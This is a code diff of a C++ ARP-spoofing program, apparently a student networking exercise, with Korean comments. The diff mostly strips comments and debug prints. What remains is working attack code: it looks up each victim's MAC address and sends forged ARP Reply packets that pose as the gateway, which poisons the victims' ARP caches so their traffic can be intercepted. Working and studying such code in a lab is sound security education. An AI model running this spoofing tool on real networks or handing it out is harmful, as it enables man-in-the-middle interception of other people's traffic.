@@ -30,7 +30,7 @@ struct myInfo {
     Ip ip_;
 };
 
-// 나의 MAC과 IP를 안전하게 추출하는 함수
+// 나의 MAC과 IP를 추출하는 함수 (구글링)
 bool get_Address(const char* interface, Mac *mac_out, Ip *ip_out){
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if(fd < 0) return false;
@@ -39,14 +39,12 @@ bool get_Address(const char* interface, Mac *mac_out, Ip *ip_out){
     ifr.ifr_addr.sa_family = AF_INET;
     strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
 
-    // 1. MAC 주소 가져오기
     if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0){
         close(fd);
         return false;
     }
     *mac_out = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
 
-    // 2. IP 주소 가져오기 (여기가 SIOCGIFADDR 이어야 합니다!)
     if(ioctl(fd, SIOCGIFADDR, &ifr) < 0){
         close(fd);
         return false;
@@ -129,7 +127,6 @@ int main(int argc, char* argv[]) {
         return EXIT_FAILURE;
     }
 
-    // 💡 공통으로 변하지 않는 ARP Spoofing 패킷 필드들을 미리 바깥에서 세팅합니다!
     EthArpPacket spoof_packet;
 
     spoof_packet.eth_.type_ = htons(EthHdr::Arp);
@@ -139,37 +136,30 @@ int main(int argc, char* argv[]) {
     spoof_packet.arp_.pro_ = htons(EthHdr::Ip4);
     spoof_packet.arp_.hln_ = MAC_SIZE;
     spoof_packet.arp_.pln_ = IPv4_SIZE;
-    spoof_packet.arp_.op_ = htons(ArpHdr::Reply); // 위조된 ARP Reply 전송
+    spoof_packet.arp_.op_ = htons(ArpHdr::Reply);
     spoof_packet.arp_.smac_ = me.mac_;
 
-    // IP 쌍을 순회하며 위조된 ARP Reply 패킷 전송
     for(int i = 2 ; i < argc ; i += 2){
         Ip victimIP(argv[i]);
         Ip gatewayIP(argv[i+1]);
 
-        // 1. 피해자 MAC 주소 먼저 획득
         Mac victimMAC = get_Vicmac(pcap, me.mac_, me.ip_, victimIP);
         if(victimMAC == Mac::nullMac()){
             fprintf(stderr, "Failed to get MAC address for victim IP(%s)\n", argv[i]);
             continue;
         }
-        printf("h");
-        // 2. 피해자마다 달라지는 목적지/위조 필드만 루프 안에서 세팅
         spoof_packet.eth_.dmac_ = victimMAC;
         spoof_packet.arp_.tmac_ = victimMAC;
-        spoof_packet.arp_.sip_ = htonl(gatewayIP); // 게이트웨이 IP로 Sender IP 위조
-        spoof_packet.arp_.tip_ = htonl(victimIP);   // 피해자 IP 설정
+        spoof_packet.arp_.sip_ = htonl(gatewayIP); 
+        spoof_packet.arp_.tip_ = htonl(victimIP); 
 
-        // 3. 패킷 전송
         int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&spoof_packet), sizeof(EthArpPacket));
-        printf("e");
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
         } else {
             printf("Send Spoofed ARP Reply -> Victim: %s | Spoofed Gateway: %s\n", argv[i], argv[i+1]);
         }
     }
-
     pcap_close(pcap);
     return 0;
 }
